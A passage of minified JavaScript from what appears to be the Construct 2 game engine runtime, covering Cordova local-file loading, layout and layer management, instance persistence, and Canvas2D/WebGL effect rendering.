            if (h = e.w, t.layer.sid !== h.l && (d = t.layer, t.layer = this.running_layout.getLayerBySid(h.l), t.layer ? (d.removeFromInstanceList(t, !0), t.layer.appendToInstanceList(t, !0), t.set_bbox_changed(), t.layer.setZIndicesStaleFrom(0)) : (t.layer = d, i || this.DestroyInstance(t))), t.x = h.x, t.y = h.y, t.width = h.w, t.height = h.h, t.zindex = h.zi, t.angle = h.hasOwnProperty("a") ? h.a : 0, t.opacity = h.hasOwnProperty("o") ? h.o : 1, t.hotspotX = h.hasOwnProperty("hX") ? h.hX : .5, t.hotspotY = h.hasOwnProperty("hY") ? h.hY : .5, t.visible = !h.hasOwnProperty("v") || h.v, t.collisionsEnabled = !h.hasOwnProperty("ce") || h.ce, t.my_timescale = h.hasOwnProperty("mts") ? h.mts : -1, t.blend_mode = h.hasOwnProperty("bm") ? h.bm : 0, t.compositeOp = cr.effectToCompositeOp(t.blend_mode), this.gl && cr.setGLBlend(t, t.blend_mode, this.gl), t.set_bbox_changed(), h.hasOwnProperty("fx"))
                for (r = 0, s = h.fx.length; r < s; r++)(c = f.getEffectIndexByName(h.fx[r].name)) < 0 || (t.active_effect_flags[c] = h.fx[r].active, t.effect_params[c] = h.fx[r].params);
            t.updateActiveEffects()
        }
        if (l = e.behs)
            for (n in l)
                if (l.hasOwnProperty(n)) {
                    if ((u = this.getBehaviorIndexBySid(t, parseInt(n, 10))) < 0) continue;
                    t.behavior_insts[u].loadFromJSON(l[n])
                } e.data && t.loadFromJSON(e.data)
    }, e.prototype.fetchLocalFileViaCordova = function (t, e, i) {
        var n = cordova.file.applicationDirectory + "www/" + t;
        window.resolveLocalFileSystemURL(n, (function (t) {
            t.file(e, i)
        }), i)
    }, e.prototype.fetchLocalFileViaCordovaAsText = function (t, e, i) {
        this.fetchLocalFileViaCordova(t, (function (t) {
            var n = new FileReader;
            n.onload = function (t) {
                e(t.target.result)
            }, n.onerror = i, n.readAsText(t)
        }), i)
    };
    var R = [],
        L = 0;
    e.prototype.maybeStartNextArrayBufferRead = function () {
        if (R.length && !(L >= 8)) {
            L++;
            var t = R.shift();
            this.doFetchLocalFileViaCordovaAsArrayBuffer(t.filename, t.successCallback, t.errorCallback)
        }
    }, e.prototype.fetchLocalFileViaCordovaAsArrayBuffer = function (t, e, i) {
        var n = this;
        R.push({
            filename: t,
            successCallback: function (t) {
                L--, n.maybeStartNextArrayBufferRead(), e(t)
            },
            errorCallback: function (t) {
                L--, n.maybeStartNextArrayBufferRead(), i(t)
            }
        }), this.maybeStartNextArrayBufferRead()
    }, e.prototype.doFetchLocalFileViaCordovaAsArrayBuffer = function (t, e, i) {
        this.fetchLocalFileViaCordova(t, (function (t) {
            var i = new FileReader;
            i.onload = function (t) {
                e(t.target.result)
            }, i.readAsArrayBuffer(t)
        }), i)
    }, e.prototype.fetchLocalFileViaCordovaAsURL = function (t, e, i) {
        var n = "",
            r = t.toLowerCase(),
            s = r.substr(r.length - 4),
            o = r.substr(r.length - 5);
        ".mp4" === s ? n = "video/mp4" : ".webm" === o ? n = "video/webm" : ".m4a" === s ? n = "audio/mp4" : ".mp3" === s && (n = "audio/mpeg"), this.fetchLocalFileViaCordovaAsArrayBuffer(t, (function (t) {
            var i = new Blob([t], {
                    type: n
                }),
                r = URL.createObjectURL(i);
            e(r)
        }), i)
    }, e.prototype.isAbsoluteUrl = function (t) {
        return /^(?:[a-z]+:)?\/\//.test(t) || "data:" === t.substr(0, 5) || "blob:" === t.substr(0, 5)
    }, e.prototype.setImageSrc = function (t, e) {
        this.isWKWebView && !this.isAbsoluteUrl(e) ? this.fetchLocalFileViaCordovaAsURL(e, (function (e) {
            t.src = e
        }), (function (t) {
            alert("Failed to load image: " + t)
        })) : t.src = e
    }, e.prototype.setCtxImageSmoothingEnabled = function (t, e) {
        void 0 !== t.imageSmoothingEnabled ? t.imageSmoothingEnabled = e : (t.webkitImageSmoothingEnabled = e, t.mozImageSmoothingEnabled = e, t.msImageSmoothingEnabled = e)
    }, cr.runtime = e, cr.createRuntime = function (t) {
        return new e(document.getElementById(t))
    }, cr.createDCRuntime = function (t, i) {
        return new e({
            dc: !0,
            width: t,
            height: i
        })
    }, window.cr_createRuntime = cr.createRuntime, window.cr_createDCRuntime = cr.createDCRuntime, window.createCocoonJSRuntime = function () {
        window.c2cocoonjs = !0;
        var t = document.createElement("screencanvas") || document.createElement("canvas");
        t.screencanvas = !0, document.body.appendChild(t);
        var i = new e(t);
        return window.c2runtime = i, window.addEventListener("orientationchange", (function () {
            window.c2runtime.setSize(window.innerWidth, window.innerHeight)
        })), window.c2runtime.setSize(window.innerWidth, window.innerHeight), i
    }, window.createEjectaRuntime = function () {
        var t = new e(document.getElementById("canvas"));
        return window.c2runtime = t, window.c2runtime.setSize(window.innerWidth, window.innerHeight), t
    }
}(), window.cr_getC2Runtime = function () {
        var t = document.getElementById("c2canvas");
        return t ? t.c2runtime : window.c2runtime ? window.c2runtime : null
    }, window.cr_getSnapshot = function (t, e) {
        var i = window.cr_getC2Runtime();
        i && i.doCanvasSnapshot(t, e)
    }, window.cr_sizeCanvas = function (t, e) {
        if (0 !== t && 0 !== e) {
            var i = window.cr_getC2Runtime();
            i && i.setSize(t, e)
        }
    }, window.cr_setSuspended = function (t) {
        var e = window.cr_getC2Runtime();
        e && e.setSuspended(t)
    },
    function () {
        function t(t, e) {
            this.runtime = t, this.event_sheet = null, this.scrollX = this.runtime.original_width / 2, this.scrollY = this.runtime.original_height / 2, this.scale = 1, this.angle = 0, this.first_visit = !0, this.name = e[0], this.originalWidth = e[1], this.originalHeight = e[2], this.width = e[1], this.height = e[2], this.unbounded_scrolling = e[3], this.sheetname = e[4], this.sid = e[5];
            var i, n, r = e[6];
            for (this.layers = [], this.initial_types = [], i = 0, n = r.length; i < n; i++) {
                var s = new cr.layer(this, r[i]);
                s.number = i, cr.seal(s), this.layers.push(s)
            }
            var o = e[7];
            for (this.initial_nonworld = [], i = 0, n = o.length; i < n; i++) {
                var a = o[i],
                    h = this.runtime.types_by_index[a[1]];
                h.default_instance || (h.default_instance = a), this.initial_nonworld.push(a), -1 === this.initial_types.indexOf(h) && this.initial_types.push(h)
            }
            for (this.effect_types = [], this.active_effect_types = [], this.shaders_preserve_opaqueness = !0, this.effect_params = [], i = 0, n = e[8].length; i < n; i++) this.effect_types.push({
                id: e[8][i][0],
                name: e[8][i][1],
                shaderindex: -1,
                preservesOpaqueness: !1,
                active: !0,
                index: i
            }), this.effect_params.push(e[8][i][2].slice(0));
            this.updateActiveEffects(), this.rcTex = new cr.rect(0, 0, 1, 1), this.rcTex2 = new cr.rect(0, 0, 1, 1), this.persist_data = {}
        }
        t.prototype.saveObjectToPersist = function (t) {
            var e = t.type.sid.toString();
            this.persist_data.hasOwnProperty(e) || (this.persist_data[e] = []), this.persist_data[e].push(this.runtime.saveInstanceToJSON(t))
        }, t.prototype.hasOpaqueBottomLayer = function () {
            var t = this.layers[0];
            return !t.transparent && 1 === t.opacity && !t.forceOwnTexture && t.visible
        }, t.prototype.updateActiveEffects = function () {
            var t, e, i;
            for (cr.clearArray(this.active_effect_types), this.shaders_preserve_opaqueness = !0, t = 0, e = this.effect_types.length; t < e; t++)(i = this.effect_types[t]).active && (this.active_effect_types.push(i), i.preservesOpaqueness || (this.shaders_preserve_opaqueness = !1))
        }, t.prototype.getEffectByName = function (t) {
            var e, i, n;
            for (e = 0, i = this.effect_types.length; e < i; e++)
                if ((n = this.effect_types[e]).name === t) return n;
            return null
        };
        var e = [];

        function i(t, e) {
            return t.zindex - e.zindex
        }
        var n = !0;
        t.prototype.startRunning = function () {
            var t, r, s, o, a, h, c, l, u, p, d, f, m, g;
            for (this.sheetname && (this.event_sheet = this.runtime.eventsheets[this.sheetname], this.event_sheet.updateDeepIncludes()), this.runtime.running_layout = this, this.width = this.originalWidth, this.height = this.originalHeight, this.scrollX = this.runtime.original_width / 2, this.scrollY = this.runtime.original_height / 2, t = 0, s = this.runtime.types_by_index.length; t < s; t++)
                if (!(a = this.runtime.types_by_index[t]).is_family)
                    for (r = 0, o = (h = a.instances).length; r < o; r++)
                        if ((l = h[r]).layer) {
                            var y = l.layer.number;
                            y >= this.layers.length && (y = this.layers.length - 1), l.layer = this.layers[y], -1 === l.layer.instances.indexOf(l) && l.layer.instances.push(l), l.layer.zindices_stale = !0
                        } if (!n)
                for (t = 0, s = this.layers.length; t < s; ++t) this.layers[t].instances.sort(i);
            for (cr.clearArray(e), this.boundScrolling(), t = 0, s = this.layers.length; t < s; t++)(g = this.layers[t]).createInitialInstances(), g.updateViewport(null);
            var _ = !1;
            if (!this.first_visit) {
                for (f in this.persist_data)
                    if (this.persist_data.hasOwnProperty(f)) {
                        if (!(a = this.runtime.getObjectTypeBySid(parseInt(f, 10))) || a.is_family || !this.runtime.typeHasPersistBehavior(a)) continue;
                        for (t = 0, s = (m = this.persist_data[f]).length; t < s; t++) g = null, a.plugin.is_world && !(g = this.getLayerBySid(m[t].w.l)) || (l = this.runtime.createInstanceFromInit(a.default_instance, g, !1, 0, 0, !0), this.runtime.loadInstanceFromJSON(l, m[t]), _ = !0, e.push(l));
                        cr.clearArray(m)
                    } for (t = 0, s = this.layers.length; t < s; t++) this.layers[t].instances.sort(i), this.layers[t].zindices_stale = !0
            }
            for (_ && (this.runtime.ClearDeathRow(), this.runtime.refreshUidMap()), t = 0; t < e.length; t++)
                if ((l = e[t]).type.is_contained)
                    for (u = l.get_iid(), r = 0, o = l.type.container.length; r < o; r++) p = l.type.container[r], l.type !== p && (p.instances.length > u ? l.siblings.push(p.instances[u]) : p.default_instance && (d = this.runtime.createInstanceFromInit(p.default_instance, l.layer, !0, l.x, l.y, !0), this.runtime.ClearDeathRow(), p.updateIIDs(), l.siblings.push(d), e.push(d)));
            for (t = 0, s = this.initial_nonworld.length; t < s; t++) c = this.initial_nonworld[t], (a = this.runtime.types_by_index[c[1]]).is_contained || (l = this.runtime.createInstanceFromInit(this.initial_nonworld[t], null, !0));
            if (this.runtime.changelayout = null, this.runtime.ClearDeathRow(), this.runtime.ctx && !this.runtime.isDomFree)
                for (t = 0, s = this.runtime.types_by_index.length; t < s; t++) !(p = this.runtime.types_by_index[t]).is_family && p.instances.length && p.preloadCanvas2D && p.preloadCanvas2D(this.runtime.ctx);
            if (this.runtime.isLoadingState) cr.shallowAssignArray(this.runtime.fireOnCreateAfterLoad, e);
            else
                for (t = 0, s = e.length; t < s; t++) l = e[t], this.runtime.trigger(Object.getPrototypeOf(l.type.plugin).cnds.OnCreated, l);
            cr.clearArray(e), this.runtime.isLoadingState || this.runtime.trigger(cr.system_object.prototype.cnds.OnLayoutStart, null), this.first_visit = !1
        }, t.prototype.createGlobalNonWorlds = function () {
            var t, e, i, n, r;
            for (t = 0, e = 0, i = this.initial_nonworld.length; t < i; t++) n = this.initial_nonworld[t], (r = this.runtime.types_by_index[n[1]]).global ? r.is_contained || this.runtime.createInstanceFromInit(n, null, !0) : (this.initial_nonworld[e] = n, e++);
            cr.truncateArray(this.initial_nonworld, e)
        }, t.prototype.stopRunning = function () {
            var t, e, i, r, s, o, a;
            if (this.runtime.isLoadingState || this.runtime.trigger(cr.system_object.prototype.cnds.OnLayoutEnd, null), this.runtime.isEndingLayout = !0, cr.clearArray(this.runtime.system.waits), !this.first_visit)
                for (t = 0, e = this.layers.length; t < e; t++)
                    for (this.layers[t].updateZIndices(), i = 0, r = (s = this.layers[t].instances).length; i < r; i++)(o = s[i]).type.global || this.runtime.typeHasPersistBehavior(o.type) && this.saveObjectToPersist(o);
            for (t = 0, e = this.layers.length; t < e; t++) {
                for (i = 0, r = (s = this.layers[t].instances).length; i < r; i++)(o = s[i]).type.global || this.runtime.DestroyInstance(o);
                this.runtime.ClearDeathRow(), cr.clearArray(s), this.layers[t].zindices_stale = !0
            }
            for (t = 0, e = this.runtime.types_by_index.length; t < e; t++)
                if (!((a = this.runtime.types_by_index[t]).global || a.plugin.is_world || a.plugin.singleglobal || a.is_family)) {
                    for (i = 0, r = a.instances.length; i < r; i++) this.runtime.DestroyInstance(a.instances[i]);
                    this.runtime.ClearDeathRow()
                } n = !1, this.runtime.isEndingLayout = !1
        };
        var r = new cr.rect(0, 0, 0, 0);

        function s(t, e) {
            this.layout = t, this.runtime = t.runtime, this.instances = [], this.scale = 1, this.angle = 0, this.disableAngle = !1, this.tmprect = new cr.rect(0, 0, 0, 0), this.tmpquad = new cr.quad, this.viewLeft = 0, this.viewRight = 0, this.viewTop = 0, this.viewBottom = 0, this.zindices_stale = !1, this.zindices_stale_from = -1, this.clear_earlyz_index = 0, this.name = e[0], this.index = e[1], this.sid = e[2], this.visible = e[3], this.background_color = e[4], this.transparent = e[5], this.parallaxX = e[6], this.parallaxY = e[7], this.opacity = e[8], this.forceOwnTexture = e[9], this.useRenderCells = e[10], this.zoomRate = e[11], this.blend_mode = e[12], this.effect_fallback = e[13], this.compositeOp = "source-over", this.srcBlend = 0, this.destBlend = 0, this.render_grid = null, this.last_render_list = a(), this.render_list_stale = !0, this.last_render_cells = new cr.rect(0, 0, -1, -1), this.cur_render_cells = new cr.rect(0, 0, -1, -1), this.useRenderCells && (this.render_grid = new cr.RenderGrid(this.runtime.original_width, this.runtime.original_height)), this.render_offscreen = !1;
            var i, n, r = e[14];
            for (this.startup_initial_instances = [], this.initial_instances = [], this.created_globals = [], i = 0, n = r.length; i < n; i++) {
                var s = r[i],
                    o = this.runtime.types_by_index[s[1]];
                o.default_instance || (o.default_instance = s, o.default_layerindex = this.index), this.initial_instances.push(s), -1 === this.layout.initial_types.indexOf(o) && this.layout.initial_types.push(o)
            }
            for (cr.shallowAssignArray(this.startup_initial_instances, this.initial_instances), this.effect_types = [], this.active_effect_types = [], this.shaders_preserve_opaqueness = !0, this.effect_params = [], i = 0, n = e[15].length; i < n; i++) this.effect_types.push({
                id: e[15][i][0],
                name: e[15][i][1],
                shaderindex: -1,
                preservesOpaqueness: !1,
                active: !0,
                index: i
            }), this.effect_params.push(e[15][i][2].slice(0));
            this.updateActiveEffects(), this.rcTex = new cr.rect(0, 0, 1, 1), this.rcTex2 = new cr.rect(0, 0, 1, 1)
        }
        t.prototype.recreateInitialObjects = function (t, e, i, n, s) {
            var o, a;
            for (r.set(e, i, n, s), o = 0, a = this.layers.length; o < a; o++) this.layers[o].recreateInitialObjects(t, r)
        }, t.prototype.draw = function (t) {
            var e, i, n, r, s = t,
                o = !1,
                a = !this.runtime.fullscreenScalingQuality;
            for (a && (this.runtime.layout_canvas || (this.runtime.layout_canvas = document.createElement("canvas"), (e = this.runtime.layout_canvas).width = this.runtime.draw_width, e.height = this.runtime.draw_height, this.runtime.layout_ctx = e.getContext("2d"), o = !0), e = this.runtime.layout_canvas, s = this.runtime.layout_ctx, e.width !== this.runtime.draw_width && (e.width = this.runtime.draw_width, o = !0), e.height !== this.runtime.draw_height && (e.height = this.runtime.draw_height, o = !0), o && this.runtime.setCtxImageSmoothingEnabled(s, this.runtime.linearSampling)), s.globalAlpha = 1, s.globalCompositeOperation = "source-over", this.runtime.clearBackground && !this.hasOpaqueBottomLayer() && s.clearRect(0, 0, this.runtime.draw_width, this.runtime.draw_height), i = 0, n = this.layers.length; i < n; i++)(r = this.layers[i]).visible && r.opacity > 0 && 11 !== r.blend_mode && (r.instances.length || !r.transparent) ? r.draw(s) : r.updateViewport(null);
            a && t.drawImage(e, 0, 0, this.runtime.width, this.runtime.height)
        }, t.prototype.drawGL_earlyZPass = function (t) {
            var e, i;
            for (t.setEarlyZPass(!0), this.runtime.layout_tex || (this.runtime.layout_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), this.runtime.layout_tex.c2width === this.runtime.draw_width && this.runtime.layout_tex.c2height === this.runtime.draw_height || (t.deleteTexture(this.runtime.layout_tex), this.runtime.layout_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), t.setRenderingToTexture(this.runtime.layout_tex), this.runtime.fullscreenScalingQuality || t.setSize(this.runtime.draw_width, this.runtime.draw_height), e = this.layers.length - 1; e >= 0; --e)(i = this.layers[e]).visible && 1 === i.opacity && i.shaders_preserve_opaqueness && 0 === i.blend_mode && (i.instances.length || !i.transparent) ? i.drawGL_earlyZPass(t) : i.updateViewport(null);
            t.setEarlyZPass(!1)
        }, t.prototype.drawGL = function (t) {
            var e, i, n, r = this.active_effect_types.length > 0 || this.runtime.uses_background_blending || !this.runtime.fullscreenScalingQuality || this.runtime.enableFrontToBack;
            for (r ? (this.runtime.layout_tex || (this.runtime.layout_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), this.runtime.layout_tex.c2width === this.runtime.draw_width && this.runtime.layout_tex.c2height === this.runtime.draw_height || (t.deleteTexture(this.runtime.layout_tex), this.runtime.layout_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), t.setRenderingToTexture(this.runtime.layout_tex), this.runtime.fullscreenScalingQuality || t.setSize(this.runtime.draw_width, this.runtime.draw_height)) : this.runtime.layout_tex && (t.setRenderingToTexture(null), t.deleteTexture(this.runtime.layout_tex), this.runtime.layout_tex = null), this.runtime.clearBackground && !this.hasOpaqueBottomLayer() && t.clear(0, 0, 0, 0), e = 0, i = this.layers.length; e < i; e++)(n = this.layers[e]).visible && n.opacity > 0 && (n.instances.length || !n.transparent) ? n.drawGL(t) : n.updateViewport(null);
            if (r)
                if (0 === this.active_effect_types.length || 1 === this.active_effect_types.length && this.runtime.fullscreenScalingQuality) {
                    if (1 === this.active_effect_types.length) {
                        var s = this.active_effect_types[0].index;
                        t.switchProgram(this.active_effect_types[0].shaderindex), t.setProgramParameters(null, 1 / this.runtime.draw_width, 1 / this.runtime.draw_height, 0, 0, 1, 1, this.scale, this.angle, 0, 0, this.runtime.draw_width / 2, this.runtime.draw_height / 2, this.runtime.kahanTime.sum, this.effect_params[s]), t.programIsAnimated(this.active_effect_types[0].shaderindex) && (this.runtime.redraw = !0)
                    } else t.switchProgram(0);
                    this.runtime.fullscreenScalingQuality || t.setSize(this.runtime.width, this.runtime.height), t.setRenderingToTexture(null), t.setDepthTestEnabled(!1), t.setOpacity(1), t.setTexture(this.runtime.layout_tex), t.setAlphaBlend(), t.resetModelView(), t.updateModelView();
                    var o = this.runtime.width / 2,
                        a = this.runtime.height / 2;
                    t.quad(-o, a, o, a, o, -a, -o, -a), t.setTexture(null), t.setDepthTestEnabled(!0)
                } else this.renderEffectChain(t, null, null, null)
        }, t.prototype.getRenderTarget = function () {
            return this.active_effect_types.length > 0 || this.runtime.uses_background_blending || !this.runtime.fullscreenScalingQuality || this.runtime.enableFrontToBack ? this.runtime.layout_tex : null
        }, t.prototype.getMinLayerScale = function () {
            var t, e, i, n = this.layers[0].getScale();
            for (t = 1, e = this.layers.length; t < e; t++) 0 === (i = this.layers[t]).parallaxX && 0 === i.parallaxY || i.getScale() < n && (n = i.getScale());
            return n
        }, t.prototype.scrollToX = function (t) {
            if (!this.unbounded_scrolling) {
                var e = this.runtime.draw_width * (1 / this.getMinLayerScale()) / 2;
                t > this.width - e && (t = this.width - e), t < e && (t = e)
            }
            this.scrollX !== t && (this.scrollX = t, this.runtime.redraw = !0)
        }, t.prototype.scrollToY = function (t) {
            if (!this.unbounded_scrolling) {
                var e = this.runtime.draw_height * (1 / this.getMinLayerScale()) / 2;
                t > this.height - e && (t = this.height - e), t < e && (t = e)
            }
            this.scrollY !== t && (this.scrollY = t, this.runtime.redraw = !0)
        }, t.prototype.boundScrolling = function () {
            this.scrollToX(this.scrollX), this.scrollToY(this.scrollY)
        }, t.prototype.renderEffectChain = function (t, e, i, n) {
            var r = i ? i.active_effect_types : e ? e.active_effect_types : this.active_effect_types,
                s = 1,
                o = 0,
                a = 0,
                h = 0,
                c = this.runtime.draw_width,
                l = this.runtime.draw_height;
            i ? (s = i.layer.getScale(), o = i.layer.getAngle(), a = i.layer.viewLeft, h = i.layer.viewTop, c = i.layer.viewRight, l = i.layer.viewBottom) : e && (s = e.getScale(), o = e.getAngle(), a = e.viewLeft, h = e.viewTop, c = e.viewRight, l = e.viewBottom);
            var u, p, d, f, m, g = this.runtime.fx_tex,
                y = 0,
                _ = 1,
                v = this.runtime.draw_width,
                b = this.runtime.draw_height,
                w = v / 2,
                x = b / 2,
                S = e ? e.rcTex : this.rcTex,
                T = e ? e.rcTex2 : this.rcTex2,
                C = 0,
                A = 0,
                O = 0,
                k = 0,
                P = v,
                I = v,
                E = b,
                R = b,
                L = 0,
                M = 0,
                B = i ? i.layer.getAngle() : 0;
            if (i) {
                for (u = 0, p = r.length; u < p; u++) L += t.getProgramBoxExtendHorizontal(r[u].shaderindex), M += t.getProgramBoxExtendVertical(r[u].shaderindex);
                var F = i.bbox;
                if (C = e.layerToCanvas(F.left, F.top, !0, !0), O = e.layerToCanvas(F.left, F.top, !1, !0), P = e.layerToCanvas(F.right, F.bottom, !0, !0), E = e.layerToCanvas(F.right, F.bottom, !1, !0), 0 !== B) {
                    var N = e.layerToCanvas(F.right, F.top, !0, !0),
                        D = e.layerToCanvas(F.right, F.top, !1, !0),
                        j = e.layerToCanvas(F.left, F.bottom, !0, !0),
                        z = e.layerToCanvas(F.left, F.bottom, !1, !0);
                    d = Math.min(C, P, N, j), P = Math.max(C, P, N, j), C = d, d = Math.min(O, E, D, z), E = Math.max(O, E, D, z), O = d
                }
                C -= L, O -= M, P += L, E += M, T.left = C / v, T.top = 1 - O / b, T.right = P / v, T.bottom = 1 - E / b, A = C = cr.floor(C), k = O = cr.floor(O), I = P = cr.ceil(P), R = E = cr.ceil(E), C < 0 && (C = 0), O < 0 && (O = 0), P > v && (P = v), E > b && (E = b), (A -= L) < 0 && (A = 0), (k -= M) < 0 && (k = 0), (I += L) > v && (I = v), (R += M) > b && (R = b), S.left = C / v, S.top = 1 - O / b, S.right = P / v, S.bottom = 1 - E / b
            } else S.left = T.left = 0, S.top = T.top = 0, S.right = T.right = 1, S.bottom = T.bottom = 1;
            var G = i && (t.programUsesDest(r[0].shaderindex) || 0 !== L || 0 !== M || 1 !== i.opacity || i.type.plugin.must_predraw) || e && !i && 1 !== e.opacity;
            t.setAlphaBlend(), G && (g[y] || (g[y] = t.createEmptyTexture(v, b, this.runtime.linearSampling)), g[y].c2width === v && g[y].c2height === b || (t.deleteTexture(g[y]), g[y] = t.createEmptyTexture(v, b, this.runtime.linearSampling)), t.switchProgram(0), t.setRenderingToTexture(g[y]), f = b - k - (m = R - k), t.clearRect(A, f, I - A, m), i ? i.drawGL(t) : (t.setTexture(this.runtime.layer_tex), t.setOpacity(e.opacity), t.resetModelView(), t.translate(-w, -x), t.updateModelView(), t.quadTex(C, E, P, E, P, O, C, O, S)), T.left = T.top = 0, T.right = T.bottom = 1, i && (d = S.top, S.top = S.bottom, S.bottom = d), y = 1, _ = 0), t.setOpacity(1);
            var W = r.length - 1,
                U = t.programUsesCrossSampling(r[W].shaderindex) || !e && !i && !this.runtime.fullscreenScalingQuality,
                V = 0;
            for (u = 0, p = r.length; u < p; u++) {
                if (g[y] || (g[y] = t.createEmptyTexture(v, b, this.runtime.linearSampling)), g[y].c2width === v && g[y].c2height === b || (t.deleteTexture(g[y]), g[y] = t.createEmptyTexture(v, b, this.runtime.linearSampling)), t.switchProgram(r[u].shaderindex), V = r[u].index, t.programIsAnimated(r[u].shaderindex) && (this.runtime.redraw = !0), 0 != u || G) t.setProgramParameters(n, 1 / v, 1 / b, T.left, T.top, T.right, T.bottom, s, o, a, h, (a + c) / 2, (h + l) / 2, this.runtime.kahanTime.sum, i ? i.effect_params[V] : e ? e.effect_params[V] : this.effect_params[V]), t.setTexture(null), u !== W || U ? (t.setRenderingToTexture(g[y]), f = b - k - (m = R - k), t.clearRect(A, f, I - A, m)) : (i ? t.setBlend(i.srcBlend, i.destBlend) : e && t.setBlend(e.srcBlend, e.destBlend), t.setRenderingToTexture(n)), t.setTexture(g[_]), t.resetModelView(), t.translate(-w, -x), t.updateModelView(), t.quadTex(C, E, P, E, P, O, C, O, S), u !== W || U || t.setTexture(null);
                else {
                    if (t.setRenderingToTexture(g[y]), f = b - k - (m = R - k), t.clearRect(A, f, I - A, m), i) {
                        var X, q;
                        if (i.curFrame && i.curFrame.texture_img) {
                            var Y = i.curFrame.texture_img;
                            X = 1 / Y.width, q = 1 / Y.height
                        } else X = 1 / i.width, q = 1 / i.height;
                        t.setProgramParameters(n, X, q, T.left, T.top, T.right, T.bottom, s, o, a, h, (a + c) / 2, (h + l) / 2, this.runtime.kahanTime.sum, i.effect_params[V]), i.drawGL(t)
                    } else t.setProgramParameters(n, 1 / v, 1 / b, 0, 0, 1, 1, s, o, a, h, (a + c) / 2, (h + l) / 2, this.runtime.kahanTime.sum, e ? e.effect_params[V] : this.effect_params[V]), t.setTexture(e ? this.runtime.layer_tex : this.runtime.layout_tex), t.resetModelView(), t.translate(-w, -x), t.updateModelView(), t.quadTex(C, E, P, E, P, O, C, O, S);
                    T.left = T.top = 0, T.right = T.bottom = 1, i && !U && (d = E, E = O, O = d)
                }
                _ = 0 === (y = 0 === y ? 1 : 0) ? 1 : 0
            }
            U && (t.switchProgram(0), i ? t.setBlend(i.srcBlend, i.destBlend) : e ? t.setBlend(e.srcBlend, e.destBlend) : this.runtime.fullscreenScalingQuality || (t.setSize(this.runtime.width, this.runtime.height), w = this.runtime.width / 2, x = this.runtime.height / 2, C = 0, O = 0, P = this.runtime.width, E = this.runtime.height), t.setRenderingToTexture(n), t.setTexture(g[_]), t.resetModelView(), t.translate(-w, -x), t.updateModelView(), i && 1 === r.length && !G ? t.quadTex(C, O, P, O, P, E, C, E, S) : t.quadTex(C, E, P, E, P, O, C, O, S), t.setTexture(null))
        }, t.prototype.getLayerBySid = function (t) {
            var e, i;
            for (e = 0, i = this.layers.length; e < i; e++)
                if (this.layers[e].sid === t) return this.layers[e];
            return null
        }, t.prototype.saveToJSON = function () {
            var t, e, i, n, r = {
                sx: this.scrollX,
                sy: this.scrollY,
                s: this.scale,
                a: this.angle,
                w: this.width,
                h: this.height,
                fv: this.first_visit,
                persist: this.persist_data,
                fx: [],
                layers: {}
            };
            for (t = 0, e = this.effect_types.length; t < e; t++) n = this.effect_types[t], r.fx.push({
                name: n.name,
                active: n.active,
                params: this.effect_params[n.index]
            });
            for (t = 0, e = this.layers.length; t < e; t++) i = this.layers[t], r.layers[i.sid.toString()] = i.saveToJSON();
            return r
        }, t.prototype.loadFromJSON = function (t) {
            var e, i, n, r, s;
            this.scrollX = t.sx, this.scrollY = t.sy, this.scale = t.s, this.angle = t.a, this.width = t.w, this.height = t.h, this.persist_data = t.persist, void 0 !== t.fv && (this.first_visit = t.fv);
            var o = t.fx;
            for (e = 0, i = o.length; e < i; e++)(n = this.getEffectByName(o[e].name)) && (n.active = o[e].active, this.effect_params[n.index] = o[e].params);
            this.updateActiveEffects();
            var a = t.layers;
            for (r in a)
                if (a.hasOwnProperty(r)) {
                    if (!(s = this.getLayerBySid(parseInt(r, 10)))) continue;
                    s.loadFromJSON(a[r])
                }
        }, cr.layout = t, s.prototype.updateActiveEffects = function () {
            var t, e, i;
            for (cr.clearArray(this.active_effect_types), this.shaders_preserve_opaqueness = !0, t = 0, e = this.effect_types.length; t < e; t++)(i = this.effect_types[t]).active && (this.active_effect_types.push(i), i.preservesOpaqueness || (this.shaders_preserve_opaqueness = !1))
        }, s.prototype.getEffectByName = function (t) {
            var e, i, n;
            for (e = 0, i = this.effect_types.length; e < i; e++)
                if ((n = this.effect_types[e]).name === t) return n;
            return null
        }, s.prototype.createInitialInstances = function () {
            var t, i, n, r, s, o, a;
            for (t = 0, i = 0, n = this.initial_instances.length; t < n; t++) {
                if (s = this.initial_instances[t], o = this.runtime.types_by_index[s[1]], a = !0, !this.runtime.typeHasPersistBehavior(o) || this.layout.first_visit) {
                    if (!(r = this.runtime.createInstanceFromInit(s, this, !0))) continue;
                    e.push(r), r.type.global && (a = !1, this.created_globals.push(r.uid))
                }
                a && (this.initial_instances[i] = this.initial_instances[t], i++)
            }
            this.initial_instances.length = i, this.runtime.ClearDeathRow(), !this.runtime.glwrap && this.effect_types.length && (this.blend_mode = this.effect_fallback), this.compositeOp = cr.effectToCompositeOp(this.blend_mode), this.runtime.gl && cr.setGLBlend(this, this.blend_mode, this.runtime.gl), this.render_list_stale = !0
        }, s.prototype.recreateInitialObjects = function (t, e) {
            var i, n, r, s, o, a, h, c, l, u, p, d = this.runtime.types_by_index,
                f = t.is_family,
                m = t.members;
            for (i = 0, n = this.initial_instances.length; i < n; ++i)
                if (a = (o = (r = this.initial_instances[i])[0])[0], h = o[1], e.contains_pt(a, h)) {
                    if ((s = d[r[1]]) !== t) {
                        if (!f) continue;
                        if (m.indexOf(s) < 0) continue
                    }
                    if (c = this.runtime.createInstanceFromInit(r, this, !1), this.runtime.isInOnDestroy++, this.runtime.trigger(Object.getPrototypeOf(s.plugin).cnds.OnCreated, c), c.is_contained)
                        for (l = 0, u = c.siblings.length; l < u; l++) p = c.siblings[i], this.runtime.trigger(Object.getPrototypeOf(p.type.plugin).cnds.OnCreated, p);
                    this.runtime.isInOnDestroy--
                }
        }, s.prototype.removeFromInstanceList = function (t, e) {
            var i = cr.fastIndexOf(this.instances, t);
            i < 0 || (e && this.useRenderCells && t.rendercells && t.rendercells.right >= t.rendercells.left && (t.update_bbox(), this.render_grid.update(t, t.rendercells, null), t.rendercells.set(0, 0, -1, -1)), i === this.instances.length - 1 ? this.instances.pop() : (cr.arrayRemove(this.instances, i), this.setZIndicesStaleFrom(i)), this.render_list_stale = !0)
        }, s.prototype.appendToInstanceList = function (t, e) {
